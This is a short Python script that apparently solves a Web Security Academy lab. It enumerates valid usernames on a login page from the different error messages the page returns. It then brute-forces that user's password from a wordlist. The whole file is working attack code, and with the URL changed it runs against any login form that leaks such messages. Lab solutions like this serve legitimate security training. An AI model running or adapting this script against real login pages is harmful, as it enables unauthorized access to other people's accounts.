import requests

url = "https://0aa500fc03a18b5183b26e400076000e.web-security-academy.net/login"

# Brute-force username
with open("usernames.txt", "r") as f:
    for line in f:
        username = line.strip()
        r = requests.post(url, data={"username": username, "password": "wrong_password"})
        if "Invalid username" not in r.text:
            break
print(username)

# Brute-force password
with open("passwords.txt", "r") as f:
    for line in f:
        password = line.strip()
        r = requests.post(url, data={"username": username, "password": password})
        if "Incorrect password" not in r.text:
            break
print(password)